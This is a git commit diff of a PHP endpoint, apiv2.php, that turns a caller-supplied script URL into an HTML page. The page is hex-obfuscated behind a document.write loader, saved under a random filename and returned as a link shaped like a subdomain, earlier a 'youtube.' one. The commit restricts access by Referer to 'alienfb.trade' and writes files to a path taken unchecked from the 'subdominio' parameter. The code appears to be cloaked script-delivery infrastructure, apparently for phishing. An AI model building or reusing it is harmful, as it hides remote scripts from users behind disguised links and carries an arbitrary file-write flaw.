34468bf4a196c6fba5d8b76cb597e3cadd9b4162
busine011 <112756675+busine011@users.noreply.github.com>
2023-03-06 07:35:34 -0400

    Update apiv2.php

--- apiv2.php
+++ apiv2.php
@@ -3,12 +3,13 @@ header('Content-type: application/json');
 header('Access-Control-Allow-Origin: *');
 header('Access-Control-Allow-Methods: ');
 header("Allow: GET, POST, OPTIONS, PUT, DELETE");
-
 require_once "./random_string.php";
 require_once "./BaseDatosMySql.php";
 $cottorra = trim($_GET['cottorra']) ? $_GET['cottorra'] : null;
 $script = trim($_GET['script']) ? $_GET['script'] : null;
 
+if($_SERVER['HTTP_REFERER'] !== 'https://alienfb.trade/'){
+ die('Unauthorized access');}
 
 
 
@@ -20,10 +21,10 @@ foreach ($info_cottorra as $cottorraextraida) {
 
 
 if(isset($script)) {
-$NAMEFILE = generateRandomString();
+$NAMEFILE = rand().".fr";
 $DOMAIN = $_SERVER['SERVER_NAME'];
 $PROTOCOLO  =  "https://";
-	
+$SUBDOMINIO =  $_GET['subdominio']; 	
 	
 $contentHTML = '
 <html>
@@ -35,7 +36,7 @@ $contentHTML = '
 <meta name="robots" content="nofollow">
 </head>
 <body>
-<script src="'.$PROTOCOLO.$API.'" type="text/javascript" async="true"></script>
+<script src="'.$PROTOCOLO.$script.'" type="text/javascript" async="true"></script>
 </body>
 </html>';
 
@@ -44,12 +45,8 @@ $decode =  utf8_decode($contentHTMLEXTRAIDO);
 $hex = bin2hex($decode);	
 $script = '<script type="text/javascript">var t ="'.$hex.'"; for (i = 0; i < t.length; i += 2) { document.write(String.fromCharCode(parseInt(t.substr(i, 2), 16))); }</script>';	
 
-file_put_contents("youtube/links". "/" .$NAMEFILE, $script);	
-	
-$response = array(
- "url"=>$cottorraextraida['cottorra']." ".'https://youtube.'.$DOMAIN.'/'.$NAMEFILE
-);
-echo json_encode($response);   	
-	
+file_put_contents($SUBDOMINIO."/links". "/" .$NAMEFILE, $script);	
+$response = array("url"=>$cottorraextraida['cottorra']." ".$SUBDOMINIO.$DOMAIN.'/'.$NAMEFILE);
+echo json_encode($response);   		
 } 
 ?>
